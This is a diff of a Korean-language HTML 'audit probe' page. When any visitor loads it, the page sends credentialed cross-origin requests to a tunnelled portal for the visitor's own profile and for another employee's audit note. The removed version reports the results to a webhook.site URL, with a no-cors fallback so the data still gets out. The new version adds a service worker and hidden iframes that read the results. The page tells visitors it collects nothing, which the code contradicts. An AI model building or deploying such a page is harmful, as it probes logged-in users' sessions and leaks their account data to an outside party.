@@ -1,68 +1,57 @@
 <!doctype html>
-<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Acme Audit Probe</title>
+<html lang="ko"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Acme Audit Lab v3</title>
 <style>
-body{font:16px/1.5 system-ui;max-width:900px;margin:32px auto;padding:0 16px;background:#101827;color:#e8eef8}
+body{font:16px/1.5 system-ui;max-width:900px;margin:30px auto;padding:0 16px;background:#101827;color:#e8eef8}
 pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0a111d;padding:14px;border:1px solid #34445d;border-radius:8px}
-button{padding:10px 14px;margin:6px 6px 6px 0} .muted{color:#a9b7cc}
-</style></head><body>
-<h1>Acme Audit Probe</h1>
-<p class="muted">자동 진단 페이지. 자격 증명/쿠키는 외부로 전송하지 않고, 응답 상태와 브라우저 성능 메타데이터만 보고합니다.</p>
-<pre id="out">초기화 중…</pre>
-<button id="run">진단 다시 실행</button>
+button{padding:10px 14px} .muted{color:#a9b7cc}
+</style>
+<body><h1>Acme Audit Lab v3</h1>
+<p class="muted">일반 fetch와 Service Worker navigation 결과를 화면에 표시합니다. 쿠키, 토큰, 응답 본문은 수집하거나 전송하지 않습니다.</p>
+<button id="run">진단 다시 실행</button><pre id="out">준비 중…</pre>
 <script>
-const PORTAL = 'https://protecting-capacity-original-intent.trycloudflare.com';
-const REPORT = 'https://webhook.site/a0c196fd-a120-4b70-877e-51728080435d';
-const out = document.querySelector("#out");
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-function entries() {
-  return performance.getEntries().map(e => ({
-    entryType:e.entryType, name:e.name, initiatorType:e.initiatorType,
-    responseStatus:e.responseStatus, workerStart:e.workerStart,
-    responseStart:e.responseStart, responseEnd:e.responseEnd,
-    transferSize:e.transferSize, encodedBodySize:e.encodedBodySize,
-    decodedBodySize:e.decodedBodySize,
-    serverTiming:e.serverTiming?.map(s => ({name:s.name,duration:s.duration,description:s.description}))
-  }));
-}
-async function run() {
-  const report = {page:location.href, at:new Date().toISOString(), tests:[], performance:[]};
-  out.textContent = "진단 실행 중…";
+const PORTAL="https://protecting-capacity-original-intent.trycloudflare.com";
+const out=document.querySelector("#out");
+const targets=[["profile-search-bob","search"],["profile-me","me"],["audit-note-bob","note"]];
+const timing=win=>win.performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
+async function run(){
+ document.querySelector("#run").disabled=true;
+ const report={page:location.href,at:new Date().toISOString(),normal:[],serviceWorker:[]};
+ out.textContent="진단 중…";
+ try{
+  const reg=await navigator.serviceWorker.register("./sw.js?v=3",{scope:"./",updateViaCache:"none"});
+  await reg.update(); await navigator.serviceWorker.ready;
   performance.clearResourceTimings();
-  for (const [label,path] of [
-    ["profile-search-bob","/api/profile/search?username=bob"],
-    ["profile-me","/api/profile/me"],
-    ["audit-note-bob","/api/profile/audit-note?employee_id=bob"]
-  ]) {
-    try {
-      const r = await fetch(PORTAL + path, {mode:"cors",credentials:"include",cache:"no-store"});
-      // Deliberately collect no response body and no credential-bearing headers.
-      report.tests.push({label,status:r.status,ok:r.ok,serverTimingHeader:r.headers.get("Server-Timing"),exposedHeaders:r.headers.get("Access-Control-Expose-Headers")});
-      await r.body?.cancel();
-    } catch(e) { report.tests.push({label,error:String(e)}); }
+  for(const [label,kind] of targets){
+   const path=kind==="me"?"/api/profile/me":kind==="note"?"/api/profile/audit-note?employee_id=bob":"/api/profile/search?username=bob";
+   try{
+    const r=await fetch(PORTAL+path,{mode:"cors",credentials:"include",cache:"no-store"});
+    report.normal.push({label,status:r.status,serverTiming:r.headers.get("Server-Timing"),exposed:r.headers.get("Access-Control-Expose-Headers")});
+    await r.body?.cancel();
+   }catch(e){report.normal.push({label,error:String(e)});}
   }
-  await sleep(250);
-  report.performance = entries();
-  out.textContent = JSON.stringify(report,null,2);
-  try {
-    const sent = await fetch(REPORT, {method:"POST",mode:"cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(report)});
-    out.textContent += "\n\nWebhook report status: " + sent.status;
-  } catch(e) {
-    // webhook.site may not grant CORS; use no-cors as a fallback. The POST body is still sent.
-    try {
-      await fetch(REPORT, {method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(report)});
-      out.textContent += "\n\nWebhook report sent (opaque response; delivery must be checked on webhook.site).";
-    } catch(e2) { out.textContent += "\n\nWebhook send failed: " + String(e2); }
+  for(const [label,kind] of targets){
+   const result=await new Promise(resolve=>{
+    const frame=document.createElement("iframe");
+    frame.hidden=true; document.body.appendChild(frame);
+    frame.onload=()=>{
+     let item={label};
+     try{
+      item.result=frame.contentDocument.querySelector("#result")?.textContent;
+      item.performance=frame.contentWindow.performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
+     }catch(e){item.error=String(e);}
+     frame.remove();resolve(item);
+    };
+    frame.onerror=()=>{frame.remove();resolve({label,error:"navigation failed"});};
+    frame.src="./__sw_probe__?target="+kind+"&t="+Date.now();
+   });
+   report.serviceWorker.push(result);
   }
+ }catch(e){report.error=String(e);}
+ report.pagePerformance=timing(window);
+ out.textContent=JSON.stringify(report,null,2);
+ document.querySelector("#run").disabled=false;
 }
 document.querySelector("#run").addEventListener("click",run);
-(async()=>{
-  try {
-    if ("serviceWorker" in navigator) {
-      await navigator.serviceWorker.register("./sw.js",{scope:"./"});
-      await navigator.serviceWorker.ready;
-    }
-    await run();
-  } catch(e) { out.textContent = "Initialization failed: " + String(e); }
-})();
+run();
 </script></body></html>
